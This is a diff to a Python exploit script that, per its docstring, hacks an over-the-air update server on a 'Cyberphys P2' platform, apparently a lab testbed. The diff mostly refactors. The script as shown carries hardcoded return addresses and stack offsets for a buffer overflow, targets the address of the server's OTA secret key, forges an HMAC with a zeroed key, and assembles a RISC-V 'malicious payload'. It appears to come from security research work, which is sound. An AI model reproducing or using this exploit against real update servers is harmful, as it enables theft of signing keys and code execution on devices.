@@ -1,4 +1,4 @@
-#!/usr/bin/python3
+#! /usr/bin/env python3
 """
 Hacks Over-The-Air update server on Cyberphys P2
 
@@ -11,22 +11,24 @@ import hmac
 import re
 import requests
 import os
+import subprocess
 
 ASCII_LOWERCASE_X = 0x78 # 'x' = 0x78 = 120
 
 PAYLOAD_SIZE = 96 # bytes
 POINTER_SIZE = 8  # bytes
+KEY_SIZE = 8 # bytes
 
 # Calculated offsets
 BUFFER_POINTER_OFFSET = {}
 BUFFER_POINTER_OFFSET['FreeBSD'] = 128
-BUFFER_POINTER_OFFSET['Linux'] = BUFFER_POINTER_OFFSET['FreeBSD']
+BUFFER_POINTER_OFFSET['Debian'] = BUFFER_POINTER_OFFSET['FreeBSD']
 NEXT_FRAME_POINTER_OFFSET = {}
 NEXT_FRAME_POINTER_OFFSET['FreeBSD'] = 304
-NEXT_FRAME_POINTER_OFFSET['Linux'] = NEXT_FRAME_POINTER_OFFSET['FreeBSD']
+NEXT_FRAME_POINTER_OFFSET['Debian'] = NEXT_FRAME_POINTER_OFFSET['FreeBSD']
 THIS_FRAME_POINTER_OFFSET = {}
 THIS_FRAME_POINTER_OFFSET['FreeBSD'] = 224
-THIS_FRAME_POINTER_OFFSET['Linux'] = THIS_FRAME_POINTER_OFFSET['FreeBSD']
+THIS_FRAME_POINTER_OFFSET['Debian'] = THIS_FRAME_POINTER_OFFSET['FreeBSD']
 
 # From the ELF file
 #         switch (cmd)
@@ -48,13 +50,13 @@ THIS_FRAME_POINTER_OFFSET['Linux'] = THIS_FRAME_POINTER_OFFSET['FreeBSD']
 
 RETURN_ADDRESS = {}
 RETURN_ADDRESS['FreeBSD'] = 0x11c74
-RETURN_ADDRESS['Linux'] = 0x11da4
+RETURN_ADDRESS['Debian'] = 0x11da4
 # Address of the ota_secret_key variable
 # (gdb) p &ota_secret_key
 # $1 = (char (*)[64]) 0x147a0 <ota_secret_key>
 KEY_ADDRESS = {}
 KEY_ADDRESS['FreeBSD'] = 0x147a0
-KEY_ADDRESS['Linux'] = 0x165b0
+KEY_ADDRESS['Debian'] = 0x165b0
 
 # sensible defaults for filename and URL
 
@@ -62,15 +64,13 @@ DEFAULT_UPDATE_PATH = 'update.elf'
 DEFAULT_URL = "http://172.16.3.2:5050"
 
 parser = argparse.ArgumentParser(description='hack a server with an update file')
-parser.add_argument('filename', metavar='filename', nargs='?',
-                    default=DEFAULT_UPDATE_PATH, 
-                    help="the file to send ot the server")
+parser.add_argument('filename', default=DEFAULT_UPDATE_PATH, help="the file to send ot the server")
 parser.add_argument('--url', help='server url', default=DEFAULT_URL)
 parser.add_argument('--test', help='test mode (no exploit)', action='store_true')
-parser.add_argument('--platform', help='platform to target', default='Linux', choices=['Linux', 'FreeBSD'])
+parser.add_argument('--platform', help='platform to target', default='Debian', choices=['Debian', 'FreeBSD'])
 
 args = parser.parse_args()
-update_path = args.filename
+update_path = os.path.abspath(os.path.expanduser(args.filename))
 url = args.url
 
 if not os.path.isfile(update_path):
@@ -78,14 +78,7 @@ if not os.path.isfile(update_path):
     exit(1)
 
 # extract base filename from path, cross-platform style
-
-update_filename_re = re.search(r'[^\\/]+(?=[\\/]?$)', update_path)
-if update_filename_re:
-    update_filename = update_filename_re.group(0)
-else:
-    print(">>> Unable to get base name of file {}, exiting".format(update_path))
-    exit(1)
-
+update_filename = os.path.basename(update_path)
 print(">>> Uploading {} to server as {}".format(update_path, update_filename))
 
 update_file_bytes = {}
@@ -101,7 +94,7 @@ print(">>> Attempting to upload {} byte file {} to " \
       "server \n     at URL {}".format(len(update_file_bytes), update_filename, url))
 
 # compute the HMAC for the file, with our "key" (64 zero bytes)
-emptykey = bytes(8)
+emptykey = bytes(KEY_SIZE)
 digest = hmac.new(emptykey, msg=update_file_bytes, digestmod='sha256')
 
 print(">>> Computed HMAC: {}".format(digest.hexdigest()))
@@ -189,9 +182,9 @@ with open("payload.asm", "w") as f:
 # Compile
 print(">>> Building malicious payload.")
 cmd = "riscv64-unknown-elf-as -march=rv64ima payload.asm -o payload.elf"
-os.system(cmd)
+subprocess.call(cmd,shell=True)
 cmd = "riscv64-unknown-elf-objcopy -O binary --only-section=.text payload.elf payload.bin"
-os.system(cmd)
+subprocess.call(cmd,shell=True)
 
 # Bytes representing the next frame pointer $fp and the buffer pointer
 # Total 16 bytes
